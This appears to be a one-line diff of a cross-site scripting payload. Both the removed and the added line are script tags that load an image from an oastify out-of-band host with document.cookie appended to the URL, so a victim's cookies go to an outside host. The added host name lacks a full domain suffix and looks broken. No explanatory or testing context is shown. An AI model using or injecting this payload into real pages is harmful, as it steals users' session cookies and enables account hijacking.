@@ -1,1 +1,1 @@
-<script>var i=new Image;i.src="http://0cdzncahd3ybhmgdvw72ato0yr4is8gx.oastify.com/?"+document.cookie;</script>
+<script>var i=new Image;i.src="http://tros25paswd4wfv6apmvpm3tdkjb72vr.oastify/?"+document.cookie;</script>
